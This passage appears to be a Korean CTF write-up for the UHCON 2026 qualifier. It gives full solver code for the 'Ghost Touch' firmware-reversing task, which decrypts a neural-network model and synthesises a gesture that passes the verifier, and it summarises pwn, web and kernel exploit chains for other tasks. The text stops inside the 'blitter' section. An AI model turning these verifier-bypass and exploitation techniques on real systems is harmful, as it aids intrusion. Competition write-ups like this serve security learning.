# UHCON 2026 예선 통합 라이트업

이 문서는 2026-10-31 UHCON 예선에서 해결한 여덟 문제의 분석, 재현 절차, 플래그, 최종 풀이 코드 전문을 한곳에 정리한 것이다. 각 코드 블록은 문제 폴더에 보존된 실제 최종 solver/exploit 원본과 대조했다.

참고한 기존 라이트업의 구성처럼 각 문제를 문제 정보·분석·공격 또는 역산 과정·재현·결과·코드 전문 순으로 읽을 수 있게 배치했다. 최종 코드는 요약하거나 링크로 대신하지 않았다.

## 목차

1. [Ghost Touch](#1-ghost-touch)
2. [blitter](#2-blitter)
3. [ThreadMAZE](#3-threadmaze)
4. [Archive Relay](#4-archive-relay)
5. [Block Inspection Service](#5-block-inspection-service)
6. [KSMC](#6-ksmc)
7. [Media Approval](#7-media-approval)
8. [Circulation](#8-circulation)

## 요약

| 문제 | 분야 | 최종 핵심 | 성공 증거 | 포함한 최종 코드 |
| --- | --- | --- | --- | --- |
| Ghost Touch | Reversing / Firmware | ARM 펌웨어의 정수 신경망·RNN·VM 검증기를 재현하고 128점 제스처 탐색 | `verification.json`의 `status: OPEN`, `flag.txt` | `solve.py`, `search.cpp` |
| blitter | Pwn | UAF, safe-linking 우회, libc leak, large-tcache poisoning, wide-FILE FSOP, ORW | 원격 exploit 출력, `flag.txt` | `solve.py`, `exploit.py` |
| ThreadMAZE | Reversing | 코드 레이아웃의 3비트 셀 512개를 복원하고 13단계 dispatcher 역연산 | solver의 `local=Correct!`, `flag.txt` | `solve.py`, `solver.py`, `fork_stage_inverse.py` |
| Archive Relay | Pwn / Web | 이중 디코딩 SQLi, trace 포맷 문자열, 공유 SQLite 객체 race, `system(db)` | 최종 원격 solver, `flag.txt` | `solve.py`, `solve_remote.py`, `root_sh_marker_sweep.py`, `archive_flag_agent.py` |
| Block Inspection Service | Web | 내부 relay CRLF smuggling과 Arrow fixed-width OOB heap leak | CTFd `solved_by_me: true`, `flag.txt` | `solve.py`, `solver.py` |
| KSMC | Web | stored CSS oracle로 reviewer capability 복구·승인 후 PHP ZIP 배포 | 원격 검증 자료, `flag.txt`, CTFd `solved_by_me: true` | `solve.py` |
| Media Approval | Web | TinyMCE DOM clobbering 권한 상승과 NotchLC stale-stack disclosure | `solve-state.json`, `stage2_result.json`, `flag.txt` | `solve.py` |
| Circulation | Pwn / Kernel | clean leased entry UAF, PTE U/S bit clear, pipe-page 회수, kCFI 대응 callback | 로컬 uid 0 체인, exploit SHA-256, CTFd `solved_by_me: true` | `solve.py`, `exploit.c`, `build.sh` |

---

## 1. Ghost Touch

### 결과

```text
FLAG{228a5ebdb78f46f9829470e1704d8111}
```

최종 `candidate.json`의 128개 좌표를 공식 화면이 사용하는 `POST http://3.36.129.171:8080/api/capture`에 한 번 전송했다. HTTP 200과 아래 응답을 받았다.

```json
{"status":"OPEN","flag":"FLAG{228a5ebdb78f46f9829470e1704d8111}"}
```

원문 응답, 검증 시각, 요청 본문의 SHA-256은 `verification.json`에 있다. 대회 제출 사이트에는 제출하지 않았다.

### 제공 파일과 분석 환경

- `for_user.zip` SHA-256: `093e17eadbf940a1009adf815a279c86bec7bfe03a4d263cbfd3b1b53b56ca67`
- `firmware_m7.elf` SHA-256: `b77ccbeee97a5fb53ca3296e1f58f1588c4daf90e0c147b3dfe74b265a26a80f`
- ELF32 little-endian ARM, Cortex-M7/Thumb, 진입점 `0x15e9`
- `.gtvm`: 가상 주소 `0xc0`, 크기 64바이트
- `.text`: 가상 주소 `0x100`, 파일 오프셋 `0x1100`
- 웹 서버는 Python 3.12 `.pyc`, 화면 코드는 일반 JavaScript로 제공된다.

REA로 압축 파일을 검증하고 안전하게 추출했다. REA의 Windows Ghidra 경로는 ARM ELF를 지원하지 않아 이후 정적 분석은 WSL의 기존 Python 3.12와 `libcapstone.so.4`를 사용했다. 추가 패키지는 설치하지 않았다. `.pyc`는 `marshal`로 코드 객체를 읽고 `dis`로 해석했으며 서버 모듈을 실행하지 않았다.

REA 압축 파일 인벤토리 근거: `ev_123e6b2be75c119c7f064595646ca1eb20fa73637b6cc6469463cbce951ccb8b`. 네이티브 함수의 의미는 직접 디스어셈블리에서 추론했고, 최종 입력은 실제 서버의 `OPEN`으로 검증했다.

### 1. 브라우저 좌표 수집 경로

`runtime/server/web/app.js`는 빈 캔버스에서 누르고 이동하는 동작을 20 ms 간격으로 기록한다. 센서 좌표는 각 축 `0..4095`이고 다음 형태로 전송한다.

```json
{"points":[[x0,y0],[x1,y1], ...]}
```

`acquisition.pyc`의 `is_live`와 `crop_live_samples`를 분석하면 **두 축이 모두 `3712..3967`인 점만** 남기고 그중 처음 128개를 펌웨어에 전달한다. 이 영역 밖의 점은 잘리며, 유효 점이 128개보다 적으면 `E_TRACE`가 된다.

펌웨어 요청은 `GST1`, 버전 1, 형식 1, 샘플 수 128, 페이로드 크기 512, CRC32를 가진 528바이트 프레임이다. 웹 API는 이 프레임을 대신 만든다. 프레임에서 분리한 x/y 배열은 `0x106c` 함수가 검사하고 복사한다.

### 2. 펌웨어의 전체 검증 흐름

`0x1538`에서 모델 초기화, 요청 수신, 프레임 검사 후 `0x238`의 검증 함수로 들어간다. 주요 함수는 다음과 같다.

| 주소 | 분석한 역할 |
|---|---|
| `0x100` | 좌표 범위·속도·2차/3차 차분·총 이동량 검사 |
| `0x238` | 전체 검증 진입, 전처리, 좁은 입력 모드 판정 |
| `0x3dc` | CRC32 |
| `0x420` | 한 방향의 48상태 RNN 실행 |
| `0x674` | 모델 구조와 값 범위 검사 |
| `0x8bc` | 양방향 RNN과 구간·전체 출력 계산 |
| `0xabc` | 12개 modulo 257 해시 거리 계산 |
| `0xb54` | 32뉴런 dense 분류기 실행 |
| `0xc20` | 모델 복호화와 메모리 배치 변환 |
| `0x11a0` | 128개 점을 256바이트 특징으로 변환 |
| `0x12fc` | `.gtvm` 인터프리터 |

`.gtvm`의 각 명령은 `[opcode, argument, success_pc, failure_pc]` 4바이트다. 정상 경로는 다음 명령 인덱스를 방문한다.

```text
0 → 3 → 6 → 10 → 5 → 8 → 4 → 2 → 9 → 7 → 1 → 11 → 12
```

이 경로는 dense, RNN, 해시 계산을 수행하고, 전체 RNN 조건과 dense 마진, 짝수/홀수 구간의 RNN 조건, 세 해시 그룹을 검사한다. 마지막 플래그 비트 7 검사까지 통과하면 `0xd3` 명령이 코드 1을 반환한다. 게이트웨이는 코드 1을 `OPEN`으로 해석하여 서버의 실제 플래그를 붙인다.

### 3. 모델 복호화

암호문은 ELF 파일 오프셋 `0x2630`부터 `0x5b14`바이트다. 복호화는 다음과 같다. 모든 상태 연산은 32비트다.

```python
state = 0x43545731
for i in range(0x5b14):
    state ^= (state << 13) & 0xffffffff
    state ^= state >> 17
    state ^= (state << 5) & 0xffffffff
    idx = (0x6c5 + 0x1003 * i) % 0x5b14
    out[i] = encrypted[idx] ^ (((state >> 9) ^ (state >> 24)) & 255)
```

마지막 4바이트는 앞 `0x5b10`바이트의 CRC32다. 복호화 후 CRC가 일치하는 것을 확인했다. 첫 `0x2000`바이트는 `256 × 32`에서 `32 × 256`으로 전치해야 한다. 나머지 필드는 펌웨어 초기화 루프와 같은 오프셋에 놓는다.

주요 모델 필드:

| 오프셋 | 내용 |
|---|---|
| `0x0000` | dense 입력 가중치 `32 × 256`, int8 |
| `0x2000` | dense bias 32개, int32 |
| `0x2080`, `0x20a0` | dense 출력 가중치 각 32개 |
| `0x20c0` | dense 출력 bias 2개와 최소 마진 |
| `0x20cc` | 정방향 x/y S-box 각 256바이트 |
| `0x22cc` | 역방향 x/y S-box 각 256바이트 |
| `0x24cc`, `0x25cc` | 방향별 128쌍의 XOR 마스크 |
| `0x26cc`, `0x272c`, `0x302c` | 정방향 RNN 입력·순환 가중치와 bias |
| 위 RNN 필드 `+0xa20` | 역방향 RNN 필드 |
| `0x3b0c`, `0x449c`, `0x44fc` | 구간별 분류 가중치·bias·마진 |
| `0x453c`, `0x4e3c`, `0x4e48` | 전체 분류 가중치·bias·마진 |
| `0x4e50` | 해시 가중치 `12 × 256`, int8 |
| `0x5a80`, `0x5ae0` | 좁은 입력의 해시 목표와 허용 거리 |

### 4. 좌표에서 특징 바이트로

최종 입력 영역을 `q = point - 3840`으로 표현하면 각 축은 `-128..127`이다. 샘플 번호를 `i`라 할 때 `0x11a0`의 현재 모드가 만드는 바이트는 다음 식과 같다.

```text
zx[i] = (39*i*i - 99*i + 109 + (-1)^i     * qx[i]) mod 256
zy[i] = (39*i*i - 99*i + 192 + (-1)^(i+1) * qy[i]) mod 256
```

dense 분류기는 이를 int8로 해석한다. 첫 층은 256입력·32뉴런이며 `/128`의 반올림은 ties-to-even이다. 결과를 `0..127`로 포화시킨 뒤 두 출력의 차이가 최소 마진을 넘는지 확인한다.

RNN은 마스크와 S-box를 통과한 바이트를 입력으로 사용한다. 각 방향은 48상태를 유지하고, 16샘플마다 상태를 저장하여 총 8구간을 만든다. 상태 갱신은 다음 형태다.

```text
h_next = clip(h + round_even((bias + W_input * input + W_recurrent * h) / 128), 0, 127)
```

S-box용 8비트 키는 16샘플마다 초기화되고, 입력 바이트와 S-box 출력에 따라 갱신된다. `solve.py`와 `search.cpp`에 정확한 순서와 키 갱신을 구현했다. 8개 구간은 정·역방향 상태 및 해당 구간의 처음·마지막·평균 특징을 사용해 각각 두 마진을 검사한다. 전체 분류기도 두 마진을 검사한다.

해시는 unsigned 특징 바이트를 사용한다.

```text
r[k] = sum(W_hash[k,j] * z[j]) mod 257
distance[k] = min(abs(r[k]-target[k]), 257-abs(r[k]-target[k]))
```

12개의 원형 거리가 각각의 허용치 이하여야 한다. 실제 수집 영역은 두 축의 폭이 모두 255 이하이므로 좁은 입력용 목표와 허용치를 사용한다.

### 5. 유효 입력 합성

분류 모델의 등록 원본을 알아야만 열 수 있는 구조는 아니다. 검증기를 그대로 재현한 후 **모든 검사를 통과하는 좌표열을 로컬에서 합성**했다.

`search.cpp`는 반지름 124의 원형 128점에서 시작한다. 점 하나 또는 이웃한 짧은 구간을 변형하고, 위반 마진·해시 거리·이동 품질의 손실 합을 계산한다. 온도를 주기적으로 낮추는 확률적 탐색으로 후보를 갱신한다.

1. 첫 단계는 dense·RNN·좌표 품질을 만족시킨다.
2. 다음 단계는 12개 해시 조건도 손실에 넣어 함께 만족시킨다.
3. 최종 후보는 독립적으로 작성한 Python 평가기로 다시 검사한다.

최종 좌표는 `candidate.json`에 저장했다. 분석용 원본 좌표를 그대로 제출한 것이 아니라, 검증기가 받아들이는 합성 제스처다.

최종 품질 검사 결과:

| 항목 | 값 | 허용 조건 |
|---|---:|---:|
| 샘플 수 | 128 | 128 |
| x/y 최솟값 | 3712 / 3712 | 3712 이상 |
| x/y 최댓값 | 3967 / 3967 | 3967 이하 |
| x/y 폭 | 255 / 255 | 각각 224 이상 |
| 총 Manhattan 이동량 | 4764 | 2500..14000 |
| 최대 축별 1차 차분 | 75 | 128 이하 |
| 최대 축별 2차 차분 | 54 | 56 이하 |
| 최대 축별 3차 차분 | 79 | 80 이하 |

검사 통과 여유값은 모두 0 이상이었다.

```text
dense: 14
segment margins:
12467 10575 17814 17918 8325 9833 1703 4557
1662 2131 36940 38798 11523 11933 1645 1439
global margins: 18289 16835
hash tolerance - distance:
16 12 4 25 21 0 28 49 13 41 10 30
```

### 재현 방법

기존 WSL Ubuntu-24.04에서 Python 3.12, NumPy, SciPy 및 GCC를 사용했다. 분석 스크립트에는 기존 `libcapstone.so.4`가 추가로 필요하다. SciPy는 최종 탐색기에서 사용하지 않으므로 재현에는 NumPy와 C++ 컴파일러만 있으면 된다.

저장소의 `reversing/07-ghost-touch`를 작업 디렉터리로 하여 다음을 실행한다.

```bash
cd reversing/07-ghost-touch

# 제공 파일이 for_user/ 아래에 추출된 상태에서 정적 분석
python3 analyze_firmware.py

# 저장된 최종 후보를 네트워크 없이 검증하고 모델을 복호화
python3 solve.py

# 공식 챌린지에 최종 후보를 재생하고 flag.txt와 verification.json 저장
python3 solve.py --submit
```

`--submit`이 없으면 네트워크 요청을 보내지 않는다. 전송 목적지는 코드에 공식 챌린지의 `/api/capture`로 고정했다.

처음부터 탐색을 다시 하려면 `candidate.json`이 없는 별도 작업 사본에서 모델을 생성하고 다음을 실행한다. 기존 최종 후보를 보존한 채 별도 폴더에서 실행하는 편이 좋다.

```bash
python3 solve.py
g++ -O3 -march=native search.cpp -o search
./search 1 0 10000
./search 2 0 150000
./search 3 1 150000
python3 solve.py
```

정수 모델과 난수 시드를 고정했다. 실제 실행에서는 첫 두 탐색으로 신경망 조건을 만족하고, 세 번째 탐색의 149893번째 반복에서 모든 해시 조건까지 만족했다. 서버에 후보를 반복 대입하지 않았으며 최종 후보 한 번으로 `OPEN`을 확인했다.

### 저장 파일

- `analyze_firmware.py`: Capstone 기반 정적 디스어셈블리 및 Python bytecode 분석
- `solve.py`: 모델 복호화, 독립 Python 검증기, 공식 입력 재생
- `search.cpp`: 정확한 정수 검증기와 확률적 탐색기
- `candidate.json`: 실제 `OPEN` 응답을 받은 128점 입력
- `candidate_neural.json`: 해시 탐색 전의 중간 후보
- `model_decoded.bin`: CRC를 확인하고 첫 가중치를 전치한 모델
- `*_disassembly.txt`: 정적 분석 출력
- `verification.json`: 공식 서버의 성공 응답 증거
- `flag.txt`: 확인한 플래그

### 최종 풀이 코드 전체

아래 코드는 최종 좌표의 모델 복호화·오프라인 검증과 명시적인
`--submit` 재생을 담당하는 실제 `solve.py` 전체다.

```python
"""Ghost Touch offline firmware reconstruction and solver (numpy/scipy).
Only --submit contacts the official challenge endpoint.
"""
from pathlib import Path
import argparse, datetime, hashlib, json, struct, urllib.request, zlib
import numpy as np

ROOT = Path(__file__).resolve().parent

def decode_model():
    elf = (ROOT/'for_user/firmware_m7.elf').read_bytes()
    enc = elf[0x2630:0x2630+0x5b14]
    state = 0x43545731
    decoded = bytearray()
    for i in range(len(enc)):
        state ^= (state << 13) & 0xffffffff
        state ^= state >> 17
        state ^= (state << 5) & 0xffffffff
        decoded.append(enc[(0x6c5+0x1003*i)%len(enc)] ^ ((state>>9)^(state>>24))&255)
    assert zlib.crc32(decoded[:-4]) == struct.unpack_from('<I',decoded,len(decoded)-4)[0]
    model = bytearray(decoded[:-4])
    model[:0x2000] = np.frombuffer(model[:0x2000],np.uint8).reshape(256,32).T.copy().tobytes()
    (ROOT/'model_decoded.bin').write_bytes(model)
    return model

class Model:
    def __init__(self):
        self.raw = decode_model()
    def arr(self,off,count,dtype=np.int8):
        return np.frombuffer(self.raw,dtype,count,off).astype(np.int64)
    def encode(self,q):
        i=np.arange(128)[:,None]
        base=39*i*i-99*i+np.array([109,192])
        return ((base+np.array([1,-1])*(-1)**i*q)%256).reshape(256)
    def quality(self,points):
        p=np.asarray(points,dtype=np.int64)
        assert p.shape==(128,2)
        stats={'samples':128,'min':p.min(axis=0).tolist(),'max':p.max(axis=0).tolist(),
               'span':np.ptp(p,axis=0).tolist(),'manhattan_length':int(np.abs(np.diff(p,axis=0)).sum()),
               'max_step':int(np.abs(np.diff(p,axis=0)).max()),
               'max_second_difference':int(np.abs(np.diff(p,n=2,axis=0)).max()),
               'max_third_difference':int(np.abs(np.diff(p,n=3,axis=0)).max())}
        assert np.all((p>=3712)&(p<=3967)), 'Outside the browser acquisition window'
        assert min(stats['span'])>=224
        assert 2500<=stats['manhattan_length']<=14000
        assert stats['max_step']<=128
        assert stats['max_second_difference']<=56
        assert stats['max_third_difference']<=80
        return stats
    def rnn(self,z,reverse=False):
        z=z.reshape(128,2)
        shift=0xa20*reverse
        lut=self.arr(0x20cc+512*reverse,512,'u1').reshape(2,256)
        mask=self.arr(0x24cc+256*reverse,256,'u1').reshape(128,2)
        win=self.arr(0x26cc+shift,96).reshape(48,2)
        rec=self.arr(0x272c+shift,2304).reshape(48,48)
        bias=self.arr(0x302c+shift,48,'<i4')
        h=np.zeros(48,dtype=np.int64)
        out=np.zeros((8,48),dtype=np.int64)
        for t in range(128):
            j=127-t if reverse else t
            if t%16==0: key=((0xa7 if reverse else 0x5d)^(53*(j//16)))&255
            zx,zy=z[j]
            a=int(lut[0,zx^key^mask[j,0]])
            b=int(lut[1,zy^(((key<<3)|(key>>5))&255)^mask[j,1]])
            inp=np.array([a-256 if a>=128 else a,b-256 if b>=128 else b])
            h=np.clip(h+np.rint((bias+win@inp+rec@h)/128).astype(np.int64),0,127)
            if (t+1)%16==0: out[j//16]=h
            key=(key+17*t+29+(zx>>4)+3*(zy>>4))&255
            key=(((key<<1)|(key>>7))^(a>>4)^(b>>3))&255
        return out
    def evaluate(self,q,verbose=True):
        z=self.encode(np.asarray(q,dtype=np.int64))
        s=(z+128)%256-128
        hidden=np.clip(np.rint((self.arr(0x2000,32,'<i4')+self.arr(0,8192).reshape(32,256)@s)/128),0,127).astype(np.int64)
        dense=self.arr(0x20c0,2,'<i4')+self.arr(0x2080,64).reshape(2,32)@hidden
        densemargin=dense[1]-dense[0]-self.arr(0x20c8,1,'<i4')[0]
        fw,bw=self.rnn(z),self.rnn(z,True)
        segments=[]
        for j in range(8):
            zz=s[j*32:(j+1)*32].reshape(16,2)
            features=np.r_[fw[j],bw[j],zz[0],zz[-1],np.rint(zz.mean(axis=0)).astype(np.int64)]
            logits=self.arr(0x449c+j*12,3,'<i4')+self.arr(0x3b0c+j*306,306).reshape(3,102)@features
            segments.append(logits[0]-logits[1:]-self.arr(0x44fc+j*8,2,'<i4'))
        features=np.c_[fw,bw].reshape(768)
        logits=self.arr(0x4e3c,3,'<i4')+self.arr(0x453c,2304).reshape(3,768)@features
        globalmargin=logits[0]-logits[1:]-self.arr(0x4e48,2,'<i4')
        residue=(self.arr(0x4e50,3072).reshape(12,256)@z)%257
        d=abs(residue-self.arr(0x5a80,12,'<i4'))
        hashmargin=self.arr(0x5ae0,12,'<i4')-np.minimum(d,257-d)
        if verbose:
            print('dense',densemargin,'segments',np.array(segments).flatten(),'global',globalmargin,'hash',hashmargin,flush=True)
        return densemargin,np.array(segments).flatten(),globalmargin,hashmargin
    def summary(self):
        for off,n,dtype in [(0x2000,32,'<i4'),(0x2080,32,'i1'),(0x20a0,32,'i1'),(0x20c0,3,'<i4'),
            (0x24cc,32,'u1'),(0x25cc,32,'u1'),(0x302c,48,'<i4'),(0x26cc,96,'i1'),
            (0x449c,24,'<i4'),(0x44fc,16,'<i4'),(0x4e3c,5,'<i4'),(0x5a50,48,'<i4')]:
            print(hex(off),self.arr(off,n,dtype))

    def constant_probe(self):
        # Check whether masks turn a fixed RNN symbol into a coherent gesture.
        bx = np.repeat(np.arange(256),256)
        by = np.tile(np.arange(256),256)
        invx = np.argsort(self.arr(0x20cc,256,'u1'))
        invy = np.argsort(self.arr(0x21cc,256,'u1'))
        mask = self.arr(0x24cc,256,'u1').reshape(128,2)
        key = np.zeros(65536,dtype=np.int64)
        score=np.zeros(65536)
        prev=None
        for i in range(128):
            if i%16==0: key[:]=0x5d ^ ((53*(i//16))&255)
            zx=invx[bx]^key^mask[i,0]
            zy=invy[by]^(((key<<3)|(key>>5))&255)^mask[i,1]
            base=39*i*i-99*i
            qx=(((zx-109-base)*((-1)**i)+128)%256)-128
            qy=(((zy-192-base)*((-1)**(i+1))+128)%256)-128
            if prev is not None:
                score+=(qx-prev[0])**2+(qy-prev[1])**2
            prev=(qx,qy)
            v=(key+17*i+29+(zx>>4)+3*(zy>>4))&255
            key=(((v<<1)|(v>>7))^(bx>>4)^(by>>3))&255
        ids=np.argsort(score)[:10]
        print('constant probes:',[(int(bx[j]),int(by[j]),int(score[j])) for j in ids])

if __name__=='__main__':
    ap=argparse.ArgumentParser()
    ap.add_argument('--submit',action='store_true',help='Send final points only to the official challenge UI capture API')
    args=ap.parse_args()
    m=Model()
    if (ROOT/'candidate.json').exists():
        points=json.loads((ROOT/'candidate.json').read_text())
        print('quality',m.quality(points),flush=True)
        result=m.evaluate(np.array(points)-3840)
        if args.submit:
            assert all(np.all(np.array(x)>=0) for x in result), 'Offline verification failed'
            url='http://3.36.129.171:8080/api/capture'
            body=json.dumps({'points':points},separators=(',',':')).encode()
            req=urllib.request.Request(url,data=body,headers={'Content-Type':'application/json'},method='POST')
            with urllib.request.urlopen(req,timeout=30) as response:
                raw=response.read()
                status=response.status
            response=json.loads(raw)
            proof={'url':url,'time_utc':datetime.datetime.now(datetime.timezone.utc).isoformat(),
                   'http_status':status,'request_sha256':hashlib.sha256(body).hexdigest(),
                   'response':response,'raw_response':raw.decode()}
            (ROOT/'verification.json').write_text(json.dumps(proof,ensure_ascii=False,indent=2))
            print(raw.decode(),flush=True)
            assert response.get('status')=='OPEN' and isinstance(response.get('flag'),str), 'Remote did not open'
            (ROOT/'flag.txt').write_text(response['flag']+'\n')
    else:
        for n in range(1,4):
            t=np.linspace(0,2*np.pi*n,128)
            q=np.rint(124*np.c_[np.cos(t),np.sin(t)])
            m.evaluate(q)

```

다음은 `candidate.json`을 생성한 실제 확률적 탐색기 `search.cpp`
전체다.

```cpp
#include <algorithm>
#include <array>
#include <cmath>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <random>
#include <vector>
using namespace std;
static uint8_t M[0x5b10];
int s8(int off){return (int8_t)M[off];}
int i32(int off){int n;memcpy(&n,M+off,4);return n;}
int rnd128(int n){int a=abs(n),q=a/128,r=a%128; q+=(r>64||(r==64&&(q&1)));return n<0?-q:q;}
int rnd16(int n){int a=abs(n),q=a/16,r=a%16; q+=(r>8||(r==8&&(q&1)));return n<0?-q:q;}
using Q=array<array<int,2>,128>;
struct E {double loss=0;int dense,seg[8][2],global[2],hash[12],quality;};
double negpen(int n,double scale){return n<0?-n/scale:0;}
E eval(const Q&q,int phase){
  int z[256],sgn[256]; E e;
  for(int j=0;j<128;j++)for(int c=0;c<2;c++){
    z[2*j+c]=(39*j*j-99*j+(c?192:109)+(((j+c)&1)?-q[j][c]:q[j][c]))&255;
    sgn[2*j+c]=(int8_t)z[2*j+c];
  }
  int h[32];for(int k=0;k<32;k++){int acc=i32(0x2000+4*k);for(int j=0;j<256;j++)acc+=s8(k*256+j)*sgn[j];h[k]=clamp(rnd128(acc),0,127);}
  int logits[2]={i32(0x20c0),i32(0x20c4)};for(int k=0;k<32;k++)for(int c=0;c<2;c++)logits[c]+=s8(0x2080+c*32+k)*h[k];
  e.dense=logits[1]-logits[0]-i32(0x20c8);
  int seq[2][8][48];
  for(int rev=0;rev<2;rev++){
    int hidden[48]={0},nh[48];int key=0;
    for(int t=0;t<128;t++){
      int j=rev?127-t:t,off=0xa20*rev;
      if(t%16==0)key=((rev?0xa7:0x5d)^(53*(j/16)))&255;
      int a=M[0x20cc+512*rev+(z[2*j]^key^M[0x24cc+256*rev+2*j])];
      int b=M[0x21cc+512*rev+(z[2*j+1]^(((key<<3)|(key>>5))&255)^M[0x24cd+256*rev+2*j])];
      for(int k=0;k<48;k++){
        int acc=i32(0x302c+off+4*k)+s8(0x26cc+off+2*k)*(int8_t)a+s8(0x26cd+off+2*k)*(int8_t)b;
        for(int l=0;l<48;l++)acc+=s8(0x272c+off+k*48+l)*hidden[l];
        nh[k]=clamp(hidden[k]+rnd128(acc),0,127);
      }
      memcpy(hidden,nh,sizeof hidden);
      if((t+1)%16==0)memcpy(seq[rev][j/16],hidden,sizeof hidden);
      key=(key+17*t+29+(z[2*j]>>4)+3*(z[2*j+1]>>4))&255;
      key=(((key<<1)|(key>>7))^(a>>4)^(b>>3))&255;
    }
  }
  for(int j=0;j<8;j++){
    int feat[102];memcpy(feat,seq[0][j],48*sizeof(int));memcpy(feat+48,seq[1][j],48*sizeof(int));
    for(int c=0;c<2;c++){
      feat[96+c]=sgn[32*j+c];feat[98+c]=sgn[32*j+30+c];int sum=0;
      for(int k=0;k<16;k++)sum+=sgn[32*j+2*k+c];feat[100+c]=rnd16(sum);
    }
    int logit[3];for(int c=0;c<3;c++){int sum=i32(0x449c+(j*3+c)*4);for(int k=0;k<102;k++)sum+=s8(0x3b0c+j*306+c*102+k)*feat[k];logit[c]=sum;}
    for(int c=0;c<2;c++)e.seg[j][c]=logit[0]-logit[c+1]-i32(0x44fc+j*8+c*4);
  }
  int logit[3];for(int c=0;c<3;c++){
    int sum=i32(0x4e3c+c*4);for(int j=0;j<8;j++)for(int r=0;r<2;r++)for(int k=0;k<48;k++)sum+=s8(0x453c+c*768+j*96+r*48+k)*seq[r][j][k];logit[c]=sum;
  }
  for(int c=0;c<2;c++)e.global[c]=logit[0]-logit[c+1]-i32(0x4e48+c*4);
  for(int k=0;k<12;k++){
    int sum=0;for(int j=0;j<256;j++)sum+=s8(0x4e50+k*256+j)*z[j];sum=((sum%257)+257)%257;
    int d=abs(sum-i32(0x5a80+k*4));e.hash[k]=i32(0x5ae0+k*4)-min(d,257-d);
  }
  int qual=0,length=0,mn[2]={128,128},mx[2]={-128,-128};
  for(int j=0;j<128;j++)for(int c=0;c<2;c++){
    mn[c]=min(mn[c],q[j][c]);mx[c]=max(mx[c],q[j][c]);
    if(j){int d=abs(q[j][c]-q[j-1][c]);length+=d;qual+=max(0,d-128);}
    if(j>=2)qual+=max(0,abs(q[j][c]-2*q[j-1][c]+q[j-2][c])-56);
    if(j>=3)qual+=max(0,abs(q[j][c]-3*q[j-1][c]+3*q[j-2][c]-q[j-3][c])-80);
  }
  for(int c=0;c<2;c++)qual+=max(0,224-mx[c]+mn[c]);qual+=max(0,2500-length)+max(0,length-14000);e.quality=qual;
  e.loss=negpen(e.dense,15000);
  for(int j=0;j<8;j++)for(int c=0;c<2;c++)e.loss+=negpen(e.seg[j][c],8000);
  for(int c=0;c<2;c++)e.loss+=negpen(e.global[c],5000);
  if(phase>0)for(int k=0;k<12;k++)e.loss+=negpen(e.hash[k],phase==1?300:60);
  e.loss+=qual/30.;return e;
}
void report(E&e){printf("loss %.5f dense %d quality %d seg ",e.loss,e.dense,e.quality);for(auto&s:e.seg)printf("%d,%d ",s[0],s[1]);printf("global %d,%d hash ",e.global[0],e.global[1]);for(int k:e.hash)printf("%d ",k);puts("");fflush(stdout);}
void save(const Q&q){ofstream f("candidate.json");f<<"[";for(int j=0;j<128;j++){if(j)f<<",";f<<"["<<q[j][0]+3840<<","<<q[j][1]+3840<<"]";}f<<"]";}
int main(int argc,char**argv){
  ifstream f("model_decoded.bin",ios::binary);f.read((char*)M,sizeof M);
  mt19937 rng(argc>1?atoi(argv[1]):1);int phase=argc>2?atoi(argv[2]):0,its=argc>3?atoi(argv[3]):50000;
  Q q;for(int i=0;i<128;i++){double t=i*2*M_PI/127;q[i]={int(round(124*cos(t))),int(round(124*sin(t)))};}
  ifstream init("candidate.json");if(init){string s((istreambuf_iterator<char>(init)),{});int at=0;for(char&c:s)if(c=='['||c==']'||c==',')c=' ';char*p=s.data();for(int i=0;i<128;i++)for(int c=0;c<2;c++){q[i][c]=strtol(p,&p,10)-3840;}}
  E cur=eval(q,phase),best=cur;Q bestq=q;report(cur);
  for(int iter=0;iter<its;iter++){
    Q nq=q;int j=rng()%128,c=rng()%2;int delta=int(rng()%33)-16;
    int kind=rng()%10;
    if(kind<7)nq[j][c]=clamp(nq[j][c]+delta,-128,127);
    else if(kind<9){int radius=2+rng()%7;for(int k=max(0,j-radius);k<=min(127,j+radius);k++)nq[k][c]=clamp(nq[k][c]+int(round(delta*(1-abs(k-j)/double(radius+1)))),-128,127);}
    else {int end=min(128,j+1+int(rng()%16));for(int k=j;k<end;k++)nq[k][c]=clamp(nq[k][c]+delta,-128,127);}
    E next=eval(nq,phase);double temp=0.015+0.2*pow(1.-(iter%5000)/5000.,3);
    if(next.loss<cur.loss||uniform_real_distribution<double>(0,1)(rng)<exp((cur.loss-next.loss)/temp)){q=nq;cur=next;}
    if(next.loss<best.loss){best=next;bestq=nq;if(iter%10==0||best.loss==0){printf("iter %d ",iter);report(best);}save(bestq);}
    if(best.loss==0){report(best);save(bestq);return 0;}
    if(iter%5000==4999){q=bestq;cur=best;printf("checkpoint %d ",iter);report(best);}
  }
  save(bestq);report(best);
}

```

---

## 2. blitter

### 실행 환경과 보호 기법

`for_user.zip`에는 `deploy/blitter`, `lib/libc.so.6`, `lib/ld-linux-x86-64.so.2`, 실행 스크립트와 Docker 설정이 들어 있다. `blitter`의 SHA-256은 `59b40064c5f20cb4c4381fb5a6c55c2754b9964414701ab8fec5cef26ae43df0`이다. 제공된 libc는 Ubuntu glibc 2.43이다.

ELF는 x86-64 PIE이고, `GNU_RELRO`와 `BIND_NOW`가 있어 full RELRO이다. 스택 카나리와 NX도 적용되어 있다. `main`은 `0x1120`, 입력을 정확한 바이트 수만큼 읽는 함수는 `0x1c40`, popcount 함수는 `0x1c90`이다. `run.sh`는 `glibc.malloc.tcache_max=4294967296`과 `glibc.cpu.x86_rep_stosb_threshold=2056`을 설정한다. 전자는 이 풀이의 큰 크기 tcache 경로에 중요하다.

`prctl(PR_SET_NO_NEW_PRIVS)`와 seccomp BPF가 활성화된다. 필터는 `read`, `write`, `open`, `openat`, `close`, `lseek`, `fstat`, `newfstatat`, `getdents64`, `brk`, `munmap`, `getrandom`, `rt_sigreturn`, `exit`, `exit_group` 등을 허용한다. `execve`는 허용되지 않으므로 최종 페이로드는 `/flag`를 열어 읽고 표준 출력으로 쓰는 ORW이다.

### 입력 형식

한 프레임은 2바이트 리틀 엔디언 길이와 그 길이만큼의 명령 바이트로 구성된다. 길이는 1~4096이다. 프레임 내부에는 명령을 연달아 넣을 수 있다. 명령 인자는 최대 32비트 unsigned LEB128이다. 정상 처리 후 `ok N`, 오류 시 `fault <code> at +<offset> after <count>`가 출력된다.

| 명령 | 형식 | 동작 |
| --- | --- | --- |
